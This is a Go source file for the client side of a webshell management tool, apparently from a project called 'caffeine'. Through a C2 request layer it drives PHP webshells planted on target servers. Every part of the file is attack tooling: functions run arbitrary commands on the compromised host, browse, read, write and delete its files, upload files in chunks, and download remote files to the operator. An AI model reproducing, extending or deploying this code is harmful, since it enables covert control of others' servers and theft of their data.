package webshell

import (
	"caffeine/client/c2"
	"caffeine/core"
	"caffeine/server"
	"caffeine/server/php"
	"encoding/base64"
	"encoding/json"
	"fmt"
	"io/ioutil"
	"path/filepath"
	"strings"
	"time"

	"github.com/sirupsen/logrus"
)

// WebClient 实现了与WebShell服务器通信的客户端
type WebClient struct {
	ID              int64
	server          server.WebShellServer
	session         *core.Session             // 当前会话信息
	requestHandler  *c2.RequestHandler        // 请求处理器
	responseHandler *c2.ResponseHandler       // 响应处理器
	http            *core.HttpEngine          // HTTP引擎实例
	logger          *logrus.Logger            // 日志记录器
	errorChan       chan error                // 错误通道，用于异步处理错误
	init            bool                      // 是否已初始化
	globalHooks     []ServerDataHook          // 全局钩子函数列表
	methodHooks     map[string]ServerDataHook // 方法级别的钩子函数映射
}

type HookMethod string

const (
	CurrentDir          = "."
	Success             = "ok"
	DefaultChunkSize    = 1024 * 1024     // 1MB chunks
	UploadSizeThreshold = 1024 * 1024 * 2 // 2MB threshold for chunked upload
)

// Hook 方法常量定义
const (
	// WebShellServer methods
	HookCheckOnline HookMethod = "CheckOnline"
	HookGetOsInfo   HookMethod = "GetOsInfo"
	HookRunCmd      HookMethod = "RunCmd"

	// FileManager methods
	HookLoadDir     HookMethod = "LoadDir"
	HookReadFile    HookMethod = "ReadFile"
	HookMakeDir     HookMethod = "MakeDir"
	HookMakeFile    HookMethod = "MakeFile"
	HookWriteFile   HookMethod = "WriteFile"
	HookDelete      HookMethod = "Delete"
	HookDownload    HookMethod = "Download"
	HookUpload      HookMethod = "Upload"
	HookUploadChunk HookMethod = "UploadChunk"
)

// Hook 类型定义
type ServerDataHook func(client *WebClient, methodName HookMethod, data []byte) []byte

// NewWebClient 创建一个新的WebShell客户端实例
// target: 目标服务器信息
// config: C2通信配置
func NewWebClient(target core.Target, config c2.C2Yaml) *WebClient {
	// Try to restore session from database first
	//cacheManager := core.GetCacheManager()
	//var session *core.Session
	//
	//if savedSession, err := cacheManager.GetSession(target.ID); err == nil {
	//	session = savedSession
	//	session.LastActive = time.Now() // Update last active time
	//} else {
	//	// Create new session if restoration fails
	session := &core.Session{
		ID:             core.GenerateID(),
		OperateHistory: nil,
		OutputHistory:  nil,
		StartTime:      time.Now(),
		LastActive:     time.Now(),
		Target:         target,
		Environment:    make(map[string]string),
	}
	//}

	client := &WebClient{
		ID:              core.GenerateID(),
		session:         session,
		server:          php.NewPHPWebShell(),
		requestHandler:  c2.NewRequestHandler(config),
		responseHandler: c2.NewResponseHandler(config),
		http:            core.GetHttpEngine(),
		logger:          core.GetLogger(),
		errorChan:       make(chan error, 3),
		globalHooks:     make([]ServerDataHook, 0),
		methodHooks:     make(map[string]ServerDataHook),
	}
	client.startErrorListener()
	return client
}

func (w *WebClient) startErrorListener() {
	go func() {
		for err := range w.errorChan {
			// 统一处理错误，例如记录日志或通知用户
			w.logger.Errorf("监听到错误: %v", err)
		}
	}()
}

func (client *WebClient) GetPHPClient() *php.PHPWebshell {
	if shell, ok := client.server.(*php.PHPWebshell); ok {
		return shell
	}
	return nil
}

// request 处理与服务器的通信请求
// methodName: 调用的方法名
// data: 请求数据
// 返回: 服务器响应数据
func (client *WebClient) request(methodName HookMethod, data []byte) []byte {
	// 应用 hooks
	data = client.processHooks(methodName, data)

	req, err := client.requestHandler.Handler(client.session, data)
	if err != nil {
		client.errorChan <- fmt.Errorf("%s handle request error: %v", methodName, err)
		return nil
	}
	err = client.http.ExecuteRequest(req)
	if err != nil {
		client.errorChan <- fmt.Errorf("%s execute request error: %v", methodName, err)
	}
	response, err := client.responseHandler.Handler(client.session, req.Response)
	client.logger.Debugf("receive data: %s", string(response))
	if err != nil {
		client.errorChan <- fmt.Errorf("%s handle response error: %v", methodName, err)
		return nil
	}
	return response
}

// Webshell 检测是否在线
func (client *WebClient) CheckConnect() bool {
	//phpClient := client.GetPHPClient()
	check := client.server.CheckOnline()
	response := client.request(HookCheckOnline, check)
	if response == nil {
		return false
	}
	//添加历史记录
	client.session.AddOperateHistory(core.GetCallerName(), nil)
	return string(response) == "hello"
}

// WebShell 初次进入，获取系统信息
func (client *WebClient) GetSystemInfo() {
	// 首先检查缓存
	//cacheManager := core.GetCacheManager()
	//if cachedInfo, err := cacheManager.GetSystemInfo(client.ID); err == nil {
	//	// 如果找到缓存，直接使用
	//	client.session.Info = cachedInfo
	//	client.session.FileSystem = core.NewFileSystem(cachedInfo.CurrentDir)
	//	return
	//}

	// 缓存未命中，从服务器获取信息
	info := client.server.GetOsInfo()
	response := client.request(HookGetOsInfo, info)
	if response == nil {
		return
	}
	var systemInfo core.SystemInfo
	err := json.Unmarshal(response, &systemInfo)

	if err != nil {
		client.errorChan <- fmt.Errorf("GetSystemInfo json unmarshal error: %v", err)
		return
	}

	// 保存到缓存
	systemInfo.ID = client.ID
	//if err := cacheManager.SaveSystemInfo(&systemInfo); err != nil {
	//	client.errorChan <- fmt.Errorf("保存系统信息到缓存失败: %v", err)
	//}

	// 更新会话信息
	client.session.Info = &systemInfo
	client.session.FileSystem = core.NewFileSystem(systemInfo.CurrentDir)
	client.session.AddOperateHistory(core.GetCallerName(), nil)
}

func (client *WebClient) GetSession() *core.Session {
	return client.session
}

func (client *WebClient) GetFileSystem() *core.FileSystemCache {
	return client.session.FileSystem
}

// webshell 执行命令
func (client *WebClient) RunCMD(path, cmd string) string {
	if path == CurrentDir {
		//获取当前目录
		path = client.session.GetCurrentDir()
	}
	runCmd := client.server.RunCmd(path, cmd)
	response := client.request(HookRunCmd, runCmd)
	if response == nil {
		return ""
	}
	client.session.AddOperateHistory(core.GetCallerName(), []string{path, cmd})
	return string(response)
}

// 加载目录
func (client *WebClient) LoadDir(path string) *core.Directory {
	if path == CurrentDir {
		path = client.session.GetCurrentDir()
	}

	// Check cache first
	// cacheManager := core.GetCacheManager()
	//if dir, err := cacheManager.GetDirectory(path); err == nil {
	//	client.session.FileSystem.CacheLoadedDir(dir)
	//	return nil
	//}

	LoadData := client.server.LoadDir(path)
	response := client.request(HookLoadDir, LoadData)
	if response == nil {
		return nil
	}
	var dir core.Directory
	err := json.Unmarshal(response, &dir)
	if err != nil {
		client.errorChan <- fmt.Errorf("LoadDir json unmarshal error: %v;data:%s", err, response)
	}
	dir.Init = true

	// Save to cache
	//cacheManager.SaveDirectory(&dir)

	client.session.FileSystem.CacheLoadedDir(&dir)
	client.session.AddOperateHistory(core.GetCallerName(), []string{path})
	return &dir
}

// 读取文件
func (client *WebClient) ReadFile(file *core.FileInfo) string {
	readFile := client.server.ReadFile(file)
	response := client.request(HookReadFile, readFile)
	if response == nil {
		return ""
	}
	file.Content = string(response)
	client.session.AddOperateHistory(core.GetCallerName(), []string{file.FilePath})
	return string(response)
}

// 写入文件
func (client *WebClient) WriteFile(file *core.FileInfo, content string) bool {
	writeFile := client.server.WriteFile(file, content)
	response := client.request(HookWriteFile, writeFile)
	if response == nil {
		return false
	}
	client.session.AddOperateHistory(core.GetCallerName(), []string{file.FilePath, content})
	return string(response) == Success
}

// 删除文件
func (client *WebClient) DeleteFile(file *core.FileInfo) bool {
	deleteData := client.server.Delete(file.FilePath)
	response := client.request(HookDelete, deleteData)
	if response == nil {
		return false
	}
	if string(response) == Success {
		directory := client.session.FileSystem.GetDirectory(filepath.Dir(file.FilePath))
		for i, f := range directory.Files {
			if f.Name == file.Name {
				directory.Files = append(directory.Files[:i], directory.Files[i+1:]...)
			}
		}
		client.session.AddOperateHistory(core.GetCallerName(), []string{file.FilePath})
		return true
	}
	return false
}

// 删除目录
func (client *WebClient) DeleteDir(dir *core.Directory) bool {
	deleteData := client.server.Delete(dir.Path)
	response := client.request(HookDelete, deleteData)
	if response == nil {
		return false
	}
	if string(response) == Success {
		client.session.FileSystem.RemoveDir(dir)
		client.session.AddOperateHistory(core.GetCallerName(), []string{dir.Path})
		return true
	}
	return false
}

// 创建文件
func (client *WebClient) MakeFile(directory *core.Directory, fileName string) *core.FileInfo {
	filePath := directory.Path + "/" + fileName
	makeFile := client.server.MakeFile(filePath)
	response := client.request(HookMakeFile, makeFile)
	if response == nil {
		return nil
	}
	if string(response) == Success {
		file := &core.FileInfo{
			Name:         fileName,
			Size:         0,
			LastModified: time.Now(),
			Content:      "",
			Permissions:  0,
			FilePath:     filePath,
		}
		directory.Files = append(directory.Files, file)
		client.session.AddOperateHistory(core.GetCallerName(), []string{filePath})
		return file
	}
	return nil
}

// 创建目录
func (client *WebClient) MakeDir(directory *core.Directory, dirName string) *core.Directory {
	dirPath := directory.Path + "/" + dirName
	makeDir := client.server.MakeDir(dirPath)
	response := client.request(HookMakeDir, makeDir)
	if response == nil {
		return nil
	}
	if string(response) == Success {
		//缓存子目录
		dir := &core.Directory{
			Name:           dirName,
			SubDirectories: make([]*core.Directory, 0),
			Files:          make([]*core.FileInfo, 0),
			Path:           dirPath,
			Init:           false,
		}
		directory.SubDirectories = append(directory.SubDirectories, dir)
		client.session.FileSystem.CacheLoadedDir(dir)
		client.session.AddOperateHistory(core.GetCallerName(), []string{dirPath})
		return dir
	}
	return nil
}

// UploadFile 实现文件上传功能
// localPath: 本地文件路径
// remotePath: 远程文件路径
// 支持大文件分块上传
func (client *WebClient) UploadFile(localPath string, remotePath string) error {
	// 读取本地文件
	data, err := ioutil.ReadFile(localPath)
	if err != nil {
		return fmt.Errorf("failed to read local file: %v", err)
	}

	// 根据文件大小决定上传方式
	if len(data) <= UploadSizeThreshold {
		// 小文件：直接上传
		encodedData := base64.StdEncoding.EncodeToString(data)
		uploadData := client.server.Upload(remotePath, encodedData)
		response := client.request(HookUpload, uploadData)

		if response == nil {
			return fmt.Errorf("upload failed")
		}
		if string(response) != Success {
			return fmt.Errorf("upload error: %s", string(response))
		}
	} else {
		// 大文件：分块上传
		totalSize := len(data)
		chunksCount := (totalSize + DefaultChunkSize - 1) / DefaultChunkSize

		for i := 0; i < chunksCount; i++ {
			start := i * DefaultChunkSize
			end := start + DefaultChunkSize
			if end > totalSize {
				end = totalSize
			}

			chunk := data[start:end]
			encodedChunk := base64.StdEncoding.EncodeToString(chunk)

			uploadData := client.server.UploadChunk(remotePath, encodedChunk, i, chunksCount)
			response := client.request(HookUploadChunk, uploadData)

			if response == nil {
				return fmt.Errorf("upload failed at chunk %d", i)
			}

			responseStr := string(response)
			if !strings.Contains(responseStr, "ok") && !strings.Contains(responseStr, "chunk_ok") {
				return fmt.Errorf("upload error at chunk %d: %s", i, responseStr)
			}
		}
	}

	client.session.AddOperateHistory(core.GetCallerName(), []string{localPath, remotePath})
	return nil
}

// DownloadFile 实现文件下载功能
// remotePath: 远程文件路径
// localPath: 本地保存路径
// 以文件读取的方式读取
func (client *WebClient) DownloadFile(remotePath string, localPath string) error {
	// 先获取文件信息
	downloadData := client.server.Download(remotePath)
	response := client.request(HookDownload, downloadData)
	if response == nil {
		return fmt.Errorf("download failed")
	}

	// 解析响应
	var result struct {
		FileSize int64  `json:"fileSize"`
		Data     string `json:"data"`
	}
	if err := json.Unmarshal(response, &result); err != nil {
		return fmt.Errorf("failed to parse response: %v", err)
	}

	// 检查是否是错误响应
	if strings.HasPrefix(result.Data, "Error://") {
		return fmt.Errorf(strings.TrimPrefix(result.Data, "Error://"))
	}

	// 解码文件内容
	fileData, err := base64.StdEncoding.DecodeString(result.Data)
	if err != nil {
		return fmt.Errorf("failed to decode file data: %v", err)
	}

	// 创建并写入本地文件
	if err := ioutil.WriteFile(localPath, fileData, 0644); err != nil {
		return fmt.Errorf("failed to write file: %v", err)
	}

	client.session.AddOperateHistory(core.GetCallerName(), []string{remotePath, localPath})
	return nil
}

// 添加全局 hook
func (client *WebClient) AddGlobalHook(hook ServerDataHook) {
	client.globalHooks = append(client.globalHooks, hook)
}

// 清除所有全局 hooks
func (client *WebClient) ClearGlobalHooks() {
	client.globalHooks = make([]ServerDataHook, 0)
}

// 设置方法级别的 hook
func (client *WebClient) SetMethodHook(methodName string, hook ServerDataHook) {
	client.methodHooks[methodName] = hook
}

// 移除方法级别的 hook
func (client *WebClient) RemoveMethodHook(methodName string) {
	delete(client.methodHooks, methodName)
}

// processHooks 处理所有注册的钩子函数
// methodName: 当前执行的方法名
// data: 原始数据
// 返回: 经过钩子处理后的数据
func (client *WebClient) processHooks(methodName HookMethod, data []byte) []byte {
	// 快速路径：如果没有任何 hooks，直接返回原始数据
	if len(client.globalHooks) == 0 && len(client.methodHooks) == 0 {
		return data
	}

	// 先应用方法级别的 hook
	if hook, exists := client.methodHooks[string(methodName)]; exists {
		data = hook(client, methodName, data)
	}

	// 按顺序应用所有全局 hooks
	for _, hook := range client.globalHooks {
		data = hook(client, methodName, data)
	}

	return data
}
